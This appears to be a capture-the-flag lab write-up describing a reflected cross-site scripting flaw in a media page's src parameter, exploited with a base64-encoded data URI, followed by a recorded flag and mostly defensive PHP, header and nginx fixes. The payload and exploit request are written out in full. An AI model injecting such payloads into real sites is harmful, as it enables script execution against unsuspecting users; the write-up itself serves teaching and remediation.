# Reflected XSS via Data URI Injection

## 🎯 Overview
This vulnerability demonstrates a reflected Cross-Site Scripting (XSS) attack through the manipulation of the `src` parameter using a data URI scheme, allowing execution of arbitrary JavaScript code.

## 🔍 Vulnerability Details
- **Endpoint**: `/index.php?page=media&src=nsa`
- **Parameter**: `src`
- **Attack Vector**: Data URI Injection
- **Impact**: JavaScript Code Execution
- **Payload Type**: Base64 Encoded Data URI

## ⚔️ Exploitation Process

### 1. Parameter Analysis
```http
# Initial testing of src parameter
GET /index.php?page=media&src=media.php HTTP/1.1
Result: Failed - Direct file inclusion not allowed
```

### 2. Data URI Payload Creation
```javascript
// Original JavaScript payload
<script>alert(42)</script>

// Base64 encoded payload
Base64: PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
```

### 3. Exploit Execution
```http
GET /index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4= HTTP/1.1
Host: x.x.x.x
```

### Attack Result
**Flag**: 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d

## 🛡️ Security Issues Identified
1. No input validation
2. Missing content security policy
3. Unfiltered data URI schemes
4. Reflected user input
5. Insufficient XSS protection

## 🔒 Recommended Security Fixes

### 1. Input Validation
```php
class MediaValidator {
    private $allowedSources = ['nsa.jpg', 'media.mp4'];
    
    public function validateSource($src) {
        if (!in_array($src, $this->allowedSources)) {
            throw new InvalidArgumentException('Invalid media source');
        }
        return $src;
    }
    
    public function sanitizeUrl($url) {
        if (preg_match('/^data:/i', $url)) {
            throw new SecurityException('Data URIs not allowed');
        }
        return filter_var($url, FILTER_SANITIZE_URL);
    }
}
```

### 2. Content Security Policy
```php
class SecurityHeaders {
    public function setCSPHeaders() {
        header("Content-Security-Policy: default-src 'self'; media-src 'self'; object-src 'none';");
    }
    
    public function setSecurityHeaders() {
        header('X-XSS-Protection: 1; mode=block');
        header('X-Content-Type-Options: nosniff');
    }
}
```

### 3. Output Encoding
```php
class OutputSanitizer {
    public function sanitizeOutput($data) {
        return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    }
    
    public function sanitizeMediaUrl($url) {
        $url = $this->sanitizeOutput($url);
        return preg_replace('/^data:/i', '', $url);
    }
}
```

### 4. Security Measures Checklist
- [ ] Implement input validation
- [ ] Add content security policy
- [ ] Enable output encoding
- [ ] Block data URI schemes
- [ ] Whitelist allowed sources
- [ ] Add XSS protection headers
- [ ] Implement logging

## 📝 Best Practices

### XSS Prevention
1. Validate all input
2. Encode all output
3. Use Content Security Policy
4. Implement proper headers
5. Use modern framework protections

### Secure Media Loading
```php
class MediaLoader {
    private $mediaPath = '/secure/media/';
    
    public function loadMedia($filename) {
        $safePath = $this->mediaPath . basename($filename);
        if (!file_exists($safePath)) {
            throw new Exception('Media not found');
        }
        return $safePath;
    }
}
```

### Nginx Configuration
```nginx
# Prevent data URI and other malicious content
location /media {
    add_header X-Content-Type-Options "nosniff";
    add_header Content-Security-Policy "default-src 'self'";
    
    # Only allow specific file types
    location ~* \.(jpg|jpeg|png|gif|mp4)$ {
        try_files $uri =404;
    }
    
    # Deny all other requests
    location ~ .* {
        return 403;
    }
}
```

## 📚 Additional Resources
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [Data URL Security Risks](https://www.mozilla.org/en-US/security/advisories/data-urls/)

## ⚠️ Disclaimer
This documentation is for educational purposes only. Always obtain proper authorization before testing security measures on any system.